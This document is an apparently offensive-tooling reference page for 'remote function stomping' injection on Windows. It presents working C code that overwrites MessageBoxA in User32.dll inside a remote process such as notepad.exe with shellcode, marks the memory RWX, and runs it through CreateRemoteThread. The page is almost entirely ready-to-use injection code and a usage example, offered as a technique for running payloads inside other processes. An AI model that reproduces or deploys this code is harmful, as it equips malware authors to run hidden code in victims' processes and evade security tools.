## Remote Function Stomping Injection

Overwrites the bytes of a sacrificial function inside a remote process with a shellcode payload using `VirtualProtectEx` and `WriteProcessMemory`, then executes the payload by creating a remote thread at the stomped function's address via `CreateRemoteThread`. The injector loads the sacrificial DLL locally, resolves the function address via `GetProcAddress`, and uses that address directly in the remote process because system DLLs are mapped at the same base address across all processes on the same boot session.

**Usage**

Call `WritePayload` with a handle to the remote process, the address of the sacrificial function, the payload buffer, and its size. After `WritePayload` returns, pass the same `pAddress` to `CreateRemoteThread` to execute the payload.

- `IN HANDLE hProcess`  A `PROCESS_ALL_ACCESS` handle to the target remote process.
- `IN PVOID pAddress`  Address of the sacrificial function inside the remote process; obtained by loading the sacrificial DLL locally and calling `GetProcAddress`.
- `IN PBYTE pPayload`  Base address of the shellcode buffer to stomp into the function.
- `IN SIZE_T sPayloadSize`  Size of `pPayload` in bytes; must not exceed the sacrificial function's size.

**Return Value**

`BOOL`  Returns `TRUE` if the payload was successfully written and memory protection was flipped to `RWX`, otherwise `FALSE`.

### Code

```c
#include <windows.h>
#include <stdio.h>

#define SACRIFICIAL_DLL "User32.dll" 
#define SACRIFICIAL_FUNC "MessageBoxA"


BOOL WritePayload(IN HANDLE hProcess, IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize)
{
    DWORD   dwOldProtection         = NULL;
    SIZE_T  sNumberOfBytesWritten   = NULL;

    // Flip the remote function's memory protection to RW so it can be overwritten.
    if (!VirtualProtectEx(
        hProcess,           // Handle to the target remote process.
        pAddress,           // Base address of the sacrificial function in the remote process.
        sPayloadSize,       // Number of bytes to change protection for.
        PAGE_READWRITE,     // New protection: read/write to allow WriteProcessMemory.
        &dwOldProtection    // Receives the original protection value.
    )) {
        printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Overwrite the sacrificial function's bytes with the payload.
    if (!WriteProcessMemory(
        hProcess,                   // Handle to the target remote process.
        pAddress,                   // Destination: sacrificial function address in the remote process.
        pPayload,                   // Source: shellcode payload buffer.
        sPayloadSize,               // Number of bytes to write.
        &sNumberOfBytesWritten      // Receives the number of bytes actually written.
    ) || sPayloadSize != sNumberOfBytesWritten) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }

    // Flip the protection to RWX so the stomped function can execute as shellcode.
    if (!VirtualProtectEx(
        hProcess,               // Handle to the target remote process.
        pAddress,               // Base address of the now-stomped function.
        sPayloadSize,           // Number of bytes to change protection for.
        PAGE_EXECUTE_READWRITE, // New protection: read, write, and execute.
        &dwOldProtection        // Receives the previous protection value.
    )) {
        printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

**Example**

```c
HANDLE  hProcess    = NULL;
HANDLE  hThread     = NULL;
PVOID   pAddress    = NULL;
DWORD   dwProcessId = NULL;
HMODULE hModule     = NULL;

// Step 1 — get a handle to the target process.
GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess);

// Step 2 — load the sacrificial DLL locally and resolve the function address.
// System DLLs share the same base address across all processes on the same boot,
// so pAddress is valid in the remote process as well.
hModule  = LoadLibraryA(SACRIFICIAL_DLL);
pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);

// Step 3 — stomp the sacrificial function with the payload.
WritePayload(hProcess, pAddress, Payload, sizeof(Payload));

// Step 4 — execute the payload by creating a remote thread at the stomped address.
hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
if (hThread != NULL)
    WaitForSingleObject(hThread, INFINITE);
```
